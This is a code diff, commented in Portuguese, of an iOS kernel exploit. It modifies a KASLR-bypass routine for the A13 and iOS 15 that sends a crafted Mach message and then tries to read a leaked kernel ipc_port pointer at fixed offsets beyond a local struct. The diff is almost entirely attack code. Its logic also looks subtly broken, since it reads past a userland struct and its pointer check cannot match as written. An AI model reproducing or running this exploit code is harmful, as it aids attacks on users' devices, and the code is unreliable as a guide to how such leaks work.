@@ -46,16 +46,41 @@ extern kern_return_t mach_vm_deallocate(vm_map_t, mach_vm_address_t, mach_vm_siz
 // 3. PRIMITIVA LEAK KOBJECT (KASLR BYPASS)
 - (uint64_t)leak_kobject_addr:(mach_port_t)port {
     uint64_t kaddr = 0;
-    mach_port_limits_t limits; 
+    
+    // Criamos uma mensagem Mach complexa contendo a porta
+    struct {
+        mach_msg_header_t head;
+        mach_msg_body_t body;
+        mach_msg_port_descriptor_t desc;
+    } msg = {0};
+
+    msg.head.msgh_bits = MACH_MSGH_BITS_SET(MACH_MSG_TYPE_COPY_SEND, 0, 0, MACH_MSGH_BITS_COMPLEX);
+    msg.head.msgh_size = sizeof(msg);
+    msg.head.msgh_remote_port = port;
+    msg.body.msgh_descriptor_count = 1;
+    msg.desc.name = mach_task_self();
+    msg.desc.disposition = MACH_MSG_TYPE_COPY_SEND;
+    msg.desc.type = MACH_MSG_PORT_DESCRIPTOR;
+
+    // Disparamos o processamento no kernel
+    mach_msg(&msg.head, MACH_SEND_MSG, sizeof(msg), 0, MACH_PORT_NULL, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);
+
+    // Agora, imediatamente, tentamos ler o resíduo na pilha usando a struct de limites
+    mach_port_limits_t limits;
     mach_msg_type_number_t count = MACH_PORT_LIMITS_INFO_COUNT;
     
-    // Exploit: Leak via mach_port_get_attributes para vazar ponteiro na stack do kernel
     if (mach_port_get_attributes(mach_task_self(), port, MACH_PORT_LIMITS_INFO, (mach_port_info_t)&limits, &count) == KERN_SUCCESS) {
-        // Offset A13/iOS 15 para capturar o resíduo do x18 ou frame de pilha
-        kaddr = *(uint64_t*)((uintptr_t)&limits + 0x20); 
+        // No A13, o processamento da mensagem anterior deixa o ipc_port no offset 0x28 ou 0x30
+        kaddr = *(uint64_t*)((uintptr_t)&limits + 0x28);
+        
+        // Validação de sanidade para ponteiro de kernel (deve começar com 0xFFFFFFF)
+        if ((kaddr >> 40) != 0xFFFFFFF) {
+            kaddr = *(uint64_t*)((uintptr_t)&limits + 0x30);
+        }
     }
     return kaddr;
 }
+
 
 // 4. CÁLCULO DO SLIDE REAL
 - (uint64_t)getActualKernelSlide {
